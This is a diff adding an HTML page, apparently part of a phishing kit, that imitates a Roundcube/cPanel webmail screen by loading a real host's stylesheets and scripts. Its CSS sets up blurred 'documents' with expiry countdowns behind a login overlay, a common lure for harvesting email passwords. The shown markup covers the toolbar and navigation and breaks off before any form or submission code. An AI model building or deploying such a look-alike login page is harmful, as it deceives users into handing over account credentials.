@@ -1,0 +1,1807 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+<title>Roundcube Webmail :: Welcome to Roundcube Webmail</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no, maximum-scale=1.0">
+<meta name="theme-color" content="#f4f4f4">
+<meta name="msapplication-navbutton-color" content="#f4f4f4">
+
+    <link rel="shortcut icon" href="https://webmail.supremecluster.com/skins/elastic/images/favicon.ico?s=1593860317">
+
+    <link rel="stylesheet" href="https://webmail.supremecluster.com/skins/elastic/deps/bootstrap.min.css?s=1593860330">
+            <link rel="stylesheet" href="https://webmail.supremecluster.com/skins/elastic/styles/styles.css?s=1593860317">
+        
+    <link rel="stylesheet" type="text/css" href="https://webmail.supremecluster.com/plugins/xskin/../xframework/assets/styles/framework.css?s=1506327547">
+<link rel="stylesheet" type="text/css" href="https://webmail.supremecluster.com/plugins/jqueryui/themes/elastic/jquery-ui.css?s=1593860316">
+<script src="https://webmail.supremecluster.com/program/js/jquery.min.js?s=1593860325"></script>
+<script src="https://webmail.supremecluster.com/program/js/common.min.js?s=1593860317"></script>
+<script src="https://webmail.supremecluster.com/program/js/app.min.js?s=1593860317"></script>
+<script src="https://webmail.supremecluster.com/program/js/jstz.min.js?s=1593860325"></script>
+<style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+    background: #e4e8ec;
+    min-height: 100vh;
+    overflow: hidden;
+}
+
+/* App shell: top toolbar | cPanel Webmail dual left nav + main */
+.app-layout {
+    display: grid;
+    grid-template-columns: 78px minmax(218px, 252px) minmax(0, 1fr);
+    grid-template-rows: auto 1fr;
+    width: 100%;
+    min-height: 100vh;
+    max-height: 100vh;
+    background: #e4e8ec;
+}
+
+.app-top-toolbar {
+    grid-column: 1 / -1;
+    grid-row: 1;
+}
+
+.wm-nav-primary {
+    grid-column: 1;
+    grid-row: 2;
+}
+
+.wm-folder-pane {
+    grid-column: 2;
+    grid-row: 2;
+}
+
+.main-stage {
+    grid-column: 3;
+    grid-row: 2;
+    position: relative;
+    min-height: 0;
+    min-width: 0;
+    overflow: hidden;
+    background-color: #f5f7f9;
+}
+
+/* Roundcube-like canvas: faint branded watermark centered */
+.main-stage::before {
+    content: '';
+    position: absolute;
+    inset: 0;
+    z-index: 0;
+    pointer-events: none;
+    background-image: var(--main-watermark, none);
+    background-repeat: no-repeat;
+    background-position: center calc(42% + 24px);
+    background-size: min(400px, 48vmin);
+    opacity: 0.075;
+    filter: grayscale(35%);
+}
+
+/* Optional second pass for readability on retina */
+@media (-webkit-min-device-pixel-ratio: 2), (min-resolution: 192dpi) {
+    .main-stage::before {
+        opacity: 0.068;
+    }
+}
+
+/* cPanel Webmail — primary dark nav (Paper Lantern / Glass style) */
+.wm-nav-primary {
+    background: #001633;
+    border-right: 1px solid #002244;
+    display: flex;
+    flex-direction: column;
+    min-height: 0;
+    color: #ffffff;
+}
+
+.wm-nav-scroll {
+    flex: 1;
+    min-height: 0;
+    overflow-y: auto;
+    overflow-x: hidden;
+    display: flex;
+    flex-direction: column;
+    align-items: stretch;
+}
+
+.wm-nav-logo-row {
+    display: flex;
+    justify-content: center;
+    padding: 12px 6px 8px;
+}
+
+.wm-nav-logo-img {
+    width: 44px;
+    height: 44px;
+    display: block;
+    object-fit: contain;
+    image-rendering: -webkit-optimize-contrast;
+}
+
+.wm-nav-tile {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: flex-start;
+    gap: 5px;
+    padding: 9px 4px;
+    margin: 0 6px;
+    border-radius: 4px;
+    font-size: 10px;
+    font-weight: 500;
+    line-height: 1.15;
+    text-decoration: none;
+    text-align: center;
+    color: #ffffff;
+    background: transparent;
+    border: none;
+    cursor: default;
+}
+
+.wm-nav-tile:hover {
+    background: rgba(255, 255, 255, 0.08);
+}
+
+.wm-nav-icon {
+    width: 26px;
+    height: 26px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: currentColor;
+}
+
+/* Stroke/outline icons (Feather-style) — primary nav */
+.wm-nav-icon svg.stroke-nav {
+    width: 23px;
+    height: 23px;
+    display: block;
+    flex-shrink: 0;
+    fill: none;
+    stroke: currentColor;
+    stroke-width: 2;
+    stroke-linecap: round;
+    stroke-linejoin: round;
+}
+
+.wm-compose-tile {
+    color: #5ecfff;
+}
+
+.wm-compose-tile:hover {
+    background: rgba(94, 207, 255, 0.12);
+}
+
+.wm-compose-tile .wm-nav-icon svg.stroke-nav {
+    stroke-width: 2;
+}
+
+.wm-nav-spacer {
+    flex: 1 1 auto;
+    min-height: 12px;
+}
+
+.wm-webmail-home-tile {
+    color: #ffffff;
+}
+
+.wm-cpanel-mark {
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    font-weight: 800;
+    font-style: italic;
+    font-size: 17px;
+    line-height: 1;
+    color: #ff6c2c;
+    letter-spacing: -0.03em;
+    font-family: system-ui, -apple-system, 'Segoe UI', sans-serif;
+}
+
+.wm-webmail-label {
+    display: block;
+    font-size: 10px;
+    line-height: 1.28;
+    font-weight: 500;
+    font-style: normal;
+    color: #ffffff;
+}
+
+.wm-nav-footer-block {
+    flex-shrink: 0;
+    border-top: 1px solid rgba(255, 255, 255, 0.14);
+    padding: 10px 0 12px;
+    background: #001633;
+}
+
+.wm-nav-tile.wm-nav-logout {
+    color: #f472b8;
+}
+
+.wm-nav-logout .wm-nav-icon svg.stroke-nav {
+    stroke-width: 2;
+}
+
+/* Secondary pane — folders (white column) */
+.wm-folder-pane {
+    background: #ffffff;
+    border-right: 1px solid #d4dce7;
+    display: flex;
+    flex-direction: column;
+    min-height: 0;
+    overflow: hidden;
+    font-size: 14px;
+    color: #1e293b;
+}
+
+.wm-folder-header {
+    flex-shrink: 0;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    padding: 10px 10px 10px 12px;
+    border-bottom: 1px solid #e6edf3;
+    background: #fafbfc;
+}
+
+.wm-folder-email-text {
+    flex: 1;
+    min-width: 0;
+    font-size: 13px;
+    font-weight: 500;
+    color: #0f172a;
+    overflow: hidden;
+    text-overflow: ellipsis;
+    white-space: nowrap;
+}
+
+.wm-folder-kebab {
+    flex-shrink: 0;
+    width: 34px;
+    height: 34px;
+    border: none;
+    border-radius: 4px;
+    background: transparent;
+    color: #475569;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    cursor: default;
+}
+
+.wm-folder-kebab:hover {
+    background: rgba(0, 0, 0, 0.05);
+}
+
+.wm-folder-scroll {
+    flex: 1;
+    overflow-y: auto;
+    overflow-x: hidden;
+    padding: 6px 0 10px;
+}
+
+.wm-folder-link {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    padding: 9px 12px;
+    margin: 1px 8px;
+    border-radius: 4px;
+    text-decoration: none;
+    color: #334155;
+    font-weight: 500;
+    cursor: default;
+}
+
+.wm-folder-link:hover {
+    background: #f1f5f9;
+}
+
+.wm-folder-link.is-selected {
+    background: #e8f4ff;
+    color: #0f172a;
+}
+
+.wm-folder-link svg.icon-folder {
+    width: 22px;
+    height: 22px;
+    flex-shrink: 0;
+    color: #64748b;
+}
+
+.wm-folder-link.is-selected svg.icon-folder {
+    color: #0369a1;
+}
+
+.wm-quota-strip {
+    flex-shrink: 0;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    padding: 10px 12px;
+    border-top: 1px solid #e6edf3;
+    background: #fafbfc;
+}
+
+.wm-quota-strip svg.disk {
+    flex-shrink: 0;
+    width: 18px;
+    height: 18px;
+    color: #64748b;
+}
+
+.wm-quota-bar {
+    flex: 1;
+    height: 7px;
+    background: #e2e8f0;
+    border-radius: 4px;
+    overflow: hidden;
+}
+
+.wm-quota-bar span {
+    display: block;
+    height: 100%;
+    width: 0%;
+    background: linear-gradient(90deg, #38bdf8, #0284c7);
+    border-radius: 4px;
+}
+
+.wm-quota-num {
+    font-size: 12px;
+    font-weight: 600;
+    color: #64748b;
+    flex-shrink: 0;
+}
+
+/* Top toolbar — Roundcube Elastic style (three columns + separators) */
+.mail-toolbar-horizontal {
+    background: #f6f8fa;
+    border-bottom: 1px solid #d8dee6;
+    padding: 0 10px;
+}
+
+.mail-toolbar-horizontal .mail-toolbar {
+    display: flex;
+    flex-wrap: nowrap;
+    align-items: stretch;
+    background: transparent;
+    padding: 4px 0;
+    gap: 8px;
+    min-height: 52px;
+    max-width: 100%;
+}
+
+.toolbar-section {
+    display: flex;
+    align-items: center;
+}
+
+.toolbar-section-account {
+    flex-shrink: 0;
+    gap: 2px;
+    padding-right: 4px;
+}
+
+.toolbar-section-tools {
+    flex-shrink: 0;
+    flex-wrap: wrap;
+    padding: 0 4px;
+}
+
+.toolbar-section-msg {
+    flex: 1;
+    min-width: 0;
+    justify-content: flex-start;
+    flex-wrap: wrap;
+    padding: 0 4px;
+}
+
+.toolbar-email {
+    flex: 0 1 auto;
+    max-width: min(480px, 36vw);
+    min-width: 0;
+    font-size: 13px;
+    line-height: 1.35;
+    font-weight: 700;
+    color: #3d4758;
+    overflow: hidden;
+    text-overflow: ellipsis;
+    white-space: nowrap;
+}
+
+.toolbar-icon-btn {
+    flex-shrink: 0;
+    width: 30px;
+    height: 32px;
+    padding: 0;
+    border: none;
+    background: transparent;
+    border-radius: 4px;
+    color: #5a6573;
+    cursor: default;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+
+.toolbar-icon-btn:hover {
+    background: rgba(0, 0, 0, 0.055);
+}
+
+.toolbar-vsep {
+    width: 1px;
+    flex-shrink: 0;
+    align-self: stretch;
+    min-height: 36px;
+    margin: 8px 12px;
+    background: #c5ced9;
+}
+
+.toolbar-section-tools .toolbar-item,
+.toolbar-section-msg .toolbar-item {
+    display: inline-flex;
+}
+
+.toolbar-item {
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    width: 56px;
+    min-height: 44px;
+    padding: 3px 1px;
+    text-decoration: none;
+    border-radius: 4px;
+    cursor: default;
+    box-sizing: border-box;
+}
+
+.toolbar-item:hover {
+    background: rgba(255, 255, 255, 0.9);
+}
+
+.toolbar-section-tools .toolbar-item-label {
+    color: #5f6b7b;
+    font-size: 10px;
+    font-weight: 500;
+    margin-top: 2px;
+    line-height: 1.2;
+}
+
+.toolbar-section-msg .toolbar-item-label {
+    color: #b1bac7;
+    font-size: 10px;
+    font-weight: 500;
+    margin-top: 2px;
+    line-height: 1.2;
+}
+
+.toolbar-item.toolbar-item-more .toolbar-item-label {
+    color: #2a3240;
+    font-weight: 600;
+}
+
+.toolbar-item.is-disabled {
+    pointer-events: none;
+}
+
+.toolbar-item.is-disabled .toolbar-item-label {
+    color: #bdc6d6;
+}
+
+.toolbar-item.is-disabled .toolbar-item-icon {
+    opacity: 0.45;
+}
+
+.toolbar-item-icon {
+    width: 22px;
+    height: 22px;
+    flex-shrink: 0;
+    color: #4f5b68;
+}
+
+.toolbar-item-icon svg {
+    width: 100%;
+    height: 100%;
+    display: block;
+}
+
+.toolbar-item-label {
+    text-align: center;
+    max-width: 100%;
+    word-break: break-word;
+}
+
+.toolbar-item.has-caret .toolbar-item-label {
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    gap: 2px;
+    flex-wrap: wrap;
+}
+
+.toolbar-caret {
+    font-size: 7px;
+    line-height: 1;
+    color: #8896a9;
+}
+
+@media (max-width: 1100px) {
+    .mail-toolbar-horizontal .mail-toolbar {
+        flex-wrap: wrap;
+    }
+    .toolbar-section-msg {
+        flex-basis: 100%;
+        padding-bottom: 4px;
+        border-top: 1px solid #e5eaef;
+        margin-top: 2px;
+        padding-top: 4px;
+    }
+}
+
+/* Background Documents */
+.documents-grid {
+    position: absolute;
+    inset: 0;
+    z-index: 1;
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    grid-auto-rows: auto;
+    align-items: start;
+    align-content: start;
+    justify-items: stretch;
+    gap: 18px;
+    padding: 18px;
+    opacity: 1;
+    filter: blur(0);
+}
+
+.file-card {
+    background: rgba(255, 255, 255, 0.99);
+    border-radius: 12px;
+    padding: 12px;
+    box-shadow: 0 14px 32px rgba(148, 163, 184, 0.3);
+    transition: all 0.3s ease;
+    position: relative;
+    overflow: hidden;
+    border: 1px solid rgba(255, 255, 255, 0.2);
+}
+
+.file-card::before {
+    content: '';
+    position: absolute;
+    top: 0;
+    left: 0;
+    right: 0;
+    height: 3px;
+    background: linear-gradient(90deg, #38bdf8, #0ea5e9);
+}
+
+.file-card:hover {
+    transform: translateY(-5px);
+    box-shadow: 0 20px 50px rgba(0, 0, 0, 0.3);
+}
+
+.file-card-thumb {
+    width: 100%;
+    height: 108px;
+    border-radius: 10px;
+    margin-bottom: 10px;
+    border: 2px solid #f3f4f6;
+    background: #f8fafc;
+    overflow: hidden;
+}
+
+.file-card-thumb img {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+    object-position: center center;
+    display: block;
+}
+
+.documents-grid .file-card-thumb img {
+    filter: blur(3px);
+    transform: scale(1.08);
+}
+
+.file-card-expiry {
+    font-size: 0.72em;
+    color: #64748b;
+    margin: 0 0 8px 0;
+    font-weight: 600;
+    line-height: 1.35;
+}
+
+.file-card h4 {
+    font-size: 0.92em;
+    margin: 0 0 6px 0;
+    color: #0f172a;
+    font-weight: 800;
+    line-height: 1.4;
+}
+
+.file-card p {
+    font-size: 0.78em;
+    color: #334155;
+    margin: 0 0 8px 0;
+    font-weight: 700;
+}
+
+.countdown {
+    position: absolute;
+    bottom: 8px;
+    right: 8px;
+    background: linear-gradient(135deg, #ef4444, #dc2626);
+    color: white;
+    font-size: 10px;
+    padding: 5px 8px;
+    border-radius: 14px;
+    font-weight: 600;
+    box-shadow: 0 5px 14px rgba(239, 68, 68, 0.35);
+}
+
+/* Login Overlay */
+.login-overlay {
+    position: absolute;
+    inset: 0;
+    background: rgba(245, 247, 249, 0.86);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    z-index: 1000;
+    backdrop-filter: blur(0.5px);
+}
+
+.login-container {
+    background: transparent;
+    border: 0;
+    border-radius: 20px;
+    padding: 18px 18px 14px;
+    box-shadow: none;
+    width: 360px;
+    max-width: 94%;
+    max-height: min(92vh, 760px);
+    text-align: center;
+    position: relative;
+    overflow: visible;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+}
+
+.login-container::before {
+    content: none;
+}
+
+.login-logo {
+    width: 120px;
+    height: auto;
+    margin: 0 0 25px;
+    filter: none;
+}
+
+.login-form {
+    text-align: center;
+    margin: 0 !important;
+    padding: 0 !important;
+    width: 100%;
+    max-width: 360px;
+    position: static !important;
+    transform: none !important;
+}
+
+.form-group {
+    margin-bottom: 12px;
+}
+
+.login-form label {
+    position: absolute;
+    width: 1px;
+    height: 1px;
+    padding: 0;
+    margin: -1px;
+    overflow: hidden;
+    clip: rect(0, 0, 0, 0);
+    white-space: nowrap;
+    border: 0;
+}
+
+.input-row {
+    display: flex;
+    align-items: stretch;
+}
+
+.input-icon {
+    width: 50px;
+    min-width: 50px;
+    border: 1px solid rgba(203, 213, 225, 0.5);
+    border-right: 0;
+    border-radius: 6px 0 0 6px;
+    background: rgba(241, 245, 249, 0.6);
+    color: #64748b;
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+}
+
+.input-icon svg {
+    width: 22px;
+    height: 22px;
+}
+
+.login-form input {
+    width: 100%;
+    padding: 12px 14px;
+    border: 1px solid rgba(203, 213, 225, 0.5);
+    border-radius: 0 6px 6px 0;
+    border-left: 0;
+    font-size: 14px;
+    transition: all 0.2s ease;
+    background: rgba(241, 245, 249, 0.6);
+    color: #334155;
+    box-sizing: border-box;
+}
+
+.login-form input:focus {
+    border-color: #38bdf8;
+    outline: none;
+    box-shadow: 0 0 0 2px rgba(56, 189, 248, 0.2);
+    background: rgba(255, 255, 255, 0.8);
+}
+
+.login-form input::placeholder {
+    color: #475569;
+}
+
+.login-button {
+    width: 100%;
+    padding: 12px 14px;
+    background: #38bdf8;
+    color: white;
+    border: none;
+    border-radius: 6px;
+    font-size: 15px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: all 0.2s ease;
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+    box-shadow: none;
+    margin-top: 10px;
+}
+
+.login-button:hover {
+    background: #0ea5e9;
+}
+
+.error-message {
+    color: #991b1b;
+    font-size: 14px;
+    margin: 12px 0;
+    padding: 12px 15px;
+    background: rgba(254, 242, 242, 0.7);
+    border-radius: 6px;
+    border: 1px solid #ef4444;
+    font-weight: 500;
+}
+
+.success-message {
+    color: #0c4a6e;
+    font-size: 14px;
+    margin: 12px 0;
+    padding: 12px 15px;
+    background: rgba(240, 249, 255, 0.7);
+    border-radius: 6px;
+    border: 1px solid #0ea5e9;
+    font-weight: 500;
+}
+
+/* Roundcube-style login feedback: fixed bottom-right */
+.wm-login-toast {
+    position: fixed;
+    bottom: 16px;
+    right: 16px;
+    z-index: 100050;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    padding: 12px 16px;
+    border-radius: 6px;
+    max-width: min(420px, calc(100vw - 32px));
+    box-shadow: 0 4px 14px rgba(15, 23, 42, 0.18);
+    font-size: 14px;
+    line-height: 1.35;
+    transition: opacity 0.2s ease, transform 0.2s ease;
+}
+
+.wm-login-toast.is-hidden {
+    opacity: 0;
+    visibility: hidden;
+    pointer-events: none;
+    transform: translateY(8px);
+}
+
+.wm-login-toast--loading {
+    background: #4b4b4b;
+    color: #fff;
+}
+
+.wm-login-toast--error {
+    background: #ffda6a;
+    color: #1e293b;
+    border: 1px solid rgba(0, 0, 0, 0.06);
+}
+
+.wm-login-toast--success {
+    background: #e0f2fe;
+    color: #0c4a6e;
+    border: 1px solid #7dd3fc;
+}
+
+.wm-login-toast__spinner {
+    width: 18px;
+    height: 18px;
+    border: 2px solid rgba(255, 255, 255, 0.35);
+    border-top-color: #fff;
+    border-radius: 50%;
+    animation: wm-login-spin 0.65s linear infinite;
+    flex-shrink: 0;
+}
+
+.wm-login-toast--error .wm-login-toast__spinner,
+.wm-login-toast--success .wm-login-toast__spinner {
+    display: none !important;
+}
+
+.wm-login-toast__warn {
+    width: 22px;
+    height: 22px;
+    flex-shrink: 0;
+    display: none;
+}
+
+.wm-login-toast--error .wm-login-toast__warn {
+    display: block;
+}
+
+.wm-login-toast--loading .wm-login-toast__warn {
+    display: none;
+}
+
+.wm-login-toast__warn svg {
+    display: block;
+    width: 22px;
+    height: 22px;
+}
+
+.wm-login-toast__text {
+    flex: 1;
+    min-width: 0;
+    word-break: break-word;
+}
+
+@keyframes wm-login-spin {
+    to {
+        transform: rotate(360deg);
+    }
+}
+
+.login-footer-text {
+    text-align: center;
+    color: #64748b;
+    margin-top: 20px;
+    font-size: 13px;
+}
+
+/* Responsive */
+@media (max-width: 1200px) {
+    .app-layout {
+        grid-template-columns: 74px minmax(200px, 234px) minmax(0, 1fr);
+    }
+    .toolbar-email {
+        max-width: min(420px, 34vw);
+    }
+}
+
+@media (max-width: 900px) {
+    .app-layout {
+        grid-template-columns: 1fr;
+        grid-template-rows: auto auto auto 1fr;
+        max-height: none;
+        min-height: 100vh;
+        overflow-y: auto;
+    }
+    .app-top-toolbar {
+        grid-column: 1;
+        grid-row: 1;
+    }
+    .wm-nav-primary {
+        grid-column: 1;
+        grid-row: 2;
+        border-right: none;
+        border-bottom: 1px solid #002244;
+        max-height: none;
+        min-height: 0;
+    }
+    .wm-nav-scroll {
+        flex-direction: row;
+        flex-wrap: wrap;
+        justify-content: center;
+        align-content: flex-start;
+        gap: 0 4px;
+        max-height: 160px;
+        overflow-y: auto;
+        padding-bottom: 4px;
+    }
+    .wm-nav-logo-row {
+        width: 100%;
+        justify-content: center;
+    }
+    .wm-nav-spacer {
+        display: none;
+    }
+    .wm-nav-footer-block {
+        display: flex;
+        flex-direction: row;
+        flex-wrap: wrap;
+        justify-content: center;
+        gap: 2px;
+    }
+    .wm-folder-pane {
+        grid-column: 1;
+        grid-row: 3;
+        max-height: 220px;
+        border-right: none;
+        border-bottom: 1px solid #d4dce7;
+    }
+    .main-stage {
+        grid-column: 1;
+        grid-row: 4;
+        min-height: 70vh;
+    }
+    .documents-grid {
+        position: relative;
+        min-height: 55vh;
+    }
+    .login-overlay {
+        position: fixed;
+        inset: 0;
+        z-index: 2000;
+    }
+    .toolbar-email {
+        max-width: 100%;
+    }
+}
+
+@media (max-width: 768px) {
+    .documents-grid {
+        grid-template-columns: repeat(2, 1fr);
+        grid-auto-rows: auto;
+        gap: 15px;
+        padding: 15px;
+    }
+    
+    .login-container {
+        width: 90%;
+        padding: 14px 12px 12px;
+    }
+}
+
+@media (max-width: 480px) {
+    .documents-grid {
+        grid-template-columns: 1fr;
+        grid-auto-rows: auto;
+        gap: 10px;
+        padding: 10px;
+    }
+    
+    .login-container {
+        width: 95%;
+        padding: 12px 10px 12px;
+    }
+
+    .input-icon {
+        width: 46px;
+        min-width: 46px;
+    }
+}
+</style>
+</head>
+<body class="task-login action-none">
+<div class="app-layout">
+    <header class="app-top-toolbar mail-toolbar-horizontal" aria-label="Mail toolbar">
+        <nav class="mail-toolbar" aria-label="Toolbar">
+            <div class="toolbar-section toolbar-section-account">
+                <span id="toolbar-display-email" class="toolbar-email" title="user@example.com">user@example.com</span>
+                <button type="button" class="toolbar-icon-btn" aria-label="Account menu" onclick="return false;">
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><circle cx="12" cy="5" r="2"/><circle cx="12" cy="12" r="2"/><circle cx="12" cy="19" r="2"/></svg>
+                </button>
+            </div>
+            <span class="toolbar-vsep" aria-hidden="true"></span>
+            <div class="toolbar-section toolbar-section-tools">
+                <a href="#" class="toolbar-item" onclick="return false;">
+                    <span class="toolbar-item-icon"><svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M5.5 3.5L5 20l4.5-4.5 3.3 6.5 2.15-1.1-3.05-6.4L20 9.5 5.5 3.5z"/></svg></span>
+                    <span class="toolbar-item-label">Select</span>
+                </a>
+                <a href="#" class="toolbar-item is-disabled" onclick="return false;" tabindex="-1" aria-disabled="true">
+                    <span class="toolbar-item-icon"><svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M20 2H4c-1.1 0-2 .9-2 2v14l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm0 12H7.17L5 14.17V4h15v10z"/><path d="M22 6v14H8.83l-2 2H22c1.1 0 2-.9 2-2V6h-2z" opacity=".45"/></svg></span>
+                    <span class="toolbar-item-label">Threads</span>
+                </a>
+                <a href="#" class="toolbar-item" onclick="return false;">
+                    <span class="toolbar-item-icon"><svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><rect x="3" y="16" width="12" height="3" rx="1.5" opacity=".32"/><circle cx="16" cy="17.5" r="4"/><rect x="3" y="4" width="8" height="3" rx="1.5" opacity=".32"/><circle cx="12" cy="5.5" r="4"/><rect x="3" y="10" width="15" height="3" rx="1.5" opacity=".32"/><circle cx="19" cy="11.5" r="4"/></svg></span>
+                    <span class="toolbar-item-label">Options</span>
+                </a>
+                <a href="#" class="toolbar-item" onclick="return false;">
+                    <span class="toolbar-item-icon"><svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M17.65 6.35A7.958 7.958 0 0012 4c-4.42 0-7.99 3.58-7.99 8s3.57 8 7.99 8c3.73 0 6.84-2.55 7.73-6h-2.08a5.99 5.99 0 01-5.65 4c-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z"/></svg></span>
+                    <span class="toolbar-item-label">Refresh</span>
+                </a>
+            </div>
+            <span class="toolbar-vsep" aria-hidden="true"></span>
+            <div class="toolbar-section toolbar-section-msg">
+                <a href="#" class="toolbar-item" onclick="return false;">
+                    <span class="toolbar-item-icon"><svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M10 9V5l-7 7 7 7v-4.1c5 0 8.5 1.6 11 5.1-1-5-4-10-11-11z"/></svg></span>
+                    <span class="toolbar-item-label">Reply</span>
+                </a>
+                <a href="#" class="toolbar-item has-caret" onclick="return false;">
+                    <span class="toolbar-item-icon"><svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M7 8V4L0 11l7 7v-4.1c5 0 8.5 1.6 11 5.1-1-5-4-10-11-11zm6 0V4l-7 7 7 7v-4.1c2 0 3.9.4 5.6 1.1l-1.8 1.8c-.8-.5-1.7-.9-2.8-1.1V8z"/></svg></span>
+                    <span class="toolbar-item-label">Reply all<span class="toolbar-caret">▼</span></span>
+                </a>
+                <a href="#" class="toolbar-item has-caret" onclick="return false;">
+                    <span class="toolbar-item-icon"><svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M12 8V4l8 8-8 8v-4c-6.07 0-11 1.66-11 7 0-5 5.93-11 11-11z"/></svg></span>
+                    <span class="toolbar-item-label">Forward<span class="toolbar-caret">▼</span></span>
+                </a>
+                <a href="#" class="toolbar-item" onclick="return false;">
+                    <span class="toolbar-item-icon"><svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M6 19c0 1.1.9 2 2 2h8c1.1 0 2-.9 2-2V7H6v12zM19 4h-3.5l-1-1h-5l-1 1H5v2h14V4z"/></svg></span>
+                    <span class="toolbar-item-label">Delete</span>
+                </a>
+                <a href="#" class="toolbar-item" onclick="return false;">
+                    <span class="toolbar-item-icon"><svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M20 2H10a2 2 0 0 0-2 2v2H4v2h2v14a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V6h2V4h-4V4a2 2 0 0 0-2-2zm0 16H10V6h10v14z"/></svg></span>
+                    <span class="toolbar-item-label">Archive</span>
+                </a>
+                <a href="#" class="toolbar-item" onclick="return false;">
+                    <span class="toolbar-item-icon"><svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="12" r="9.75" fill="none" stroke="currentColor" stroke-width="2"/><path fill="currentColor" d="M12 9.75c-.15 1.6.95 2.8 2.2 4-2.95-.65-4.05 2.15-4.3 5.85-.06.85.5 1.55 1.35 1.75.52.13 1.05-.06 1.35-.62.72-1.35.74-3.28-.72-6.53-.45-.85-.88-3.08-.88-4.45z"/></svg></span>
+                    <span class="toolbar-item-label">Junk</span>
+                </a>
+                <a href="#" class="toolbar-item" onclick="return false;">
+                    <span class="toolbar-item-icon"><svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M17.63 5.84C17.27 5.33 16.67 5 16 5L5 5.01C3.9 5.01 3 5.9 3 7v10c0 1.1.9 2 2 2h11c.67 0 1.27-.33 1.63-.84L22 12l-4.37-6.16z"/></svg></span>
+                    <span class="toolbar-item-label">Mark</span>
+                </a>
+                <a href="#" class="toolbar-item toolbar-item-more" onclick="return false;">
+                    <span class="toolbar-item-icon"><svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><circle cx="5" cy="12" r="2"/><circle cx="12" cy="12" r="2"/><circle cx="19" cy="12" r="2"/></svg></span>
+                    <span class="toolbar-item-label">More</span>
+                </a>
+            </div>
+        </nav>
+    </header>
+
+    <aside class="wm-nav-primary" aria-label="Webmail apps">
+        <div class="wm-nav-scroll">
+            <div class="wm-nav-logo-row">
+                <img class="wm-nav-logo-img" src="/tmp5/roundcube-webmail/images/webmail-logo.png" width="44" height="44" alt="" loading="eager" decoding="async">
+            </div>
+            <a href="#" class="wm-nav-tile wm-compose-tile" onclick="return false;">
+                <span class="wm-nav-icon">
+                    <!-- Tabler Icons "edit" — note + pencil (MIT) -->
+                    <svg class="stroke-nav" viewBox="0 0 24 24" aria-hidden="true"><path d="M7 7h-1a2 2 0 0 0-2 2v9a2 2 0 0 0 2 2h9a2 2 0 0 0 2-2v-1"/><path d="M20.385 6.585a2.1 2.1 0 0 0-2.97-2.97l-8.415 8.385v3h3l8.385-8.415"/><path d="M16 5l3 3"/></svg>
+                </span>
+                Compose            </a>
+            <a href="#" class="wm-nav-tile" onclick="return false;">
+                <span class="wm-nav-icon">
+                    <svg class="stroke-nav" viewBox="0 0 24 24" aria-hidden="true"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg>
+                </span>
+                Mail            </a>
+            <a href="#" class="wm-nav-tile" onclick="return false;">
+                <span class="wm-nav-icon">
+                    <svg class="stroke-nav" viewBox="0 0 24 24" aria-hidden="true"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg>
+                </span>
+                Contacts            </a>
+            <a href="#" class="wm-nav-tile" onclick="return false;">
+                <span class="wm-nav-icon">
+                    <svg class="stroke-nav" viewBox="0 0 24 24" aria-hidden="true"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>
+                </span>
+                Calendar            </a>
+            <a href="#" class="wm-nav-tile" onclick="return false;">
+                <span class="wm-nav-icon">
